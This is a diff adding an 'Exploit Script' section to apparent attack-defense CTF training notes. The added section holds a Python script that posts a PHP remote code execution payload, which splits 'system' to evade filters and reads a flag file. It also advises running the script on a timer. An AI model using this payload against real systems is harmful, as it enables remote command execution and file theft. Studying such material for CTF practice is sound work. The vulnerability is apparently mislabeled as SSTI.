@@ -226,3 +226,22 @@ GitHub repo of an example flag submitter:
 
 ![img](file/Week 14-5.png)
 
+## Exploit Script
+
+Using manual exploit is not efficient. By using automate script to exploit and submit the flag.
+
+An example exploit script of a SSTI vulnerability looks like:
+
+```python
+import requests
+url = ""
+data = {
+    "method": "__construct",
+    "filter[]": "assert",
+    "method": "get",
+    "get[]": "die((new ReflectionFunction('syste'.'m'))->invoke('cat /var/flag.txt'))",
+}
+print(requests.post(url, data=data).text)
+```
+
+The script can be configured to run every 5 minutes or using flag submitter to hook the exploit script.
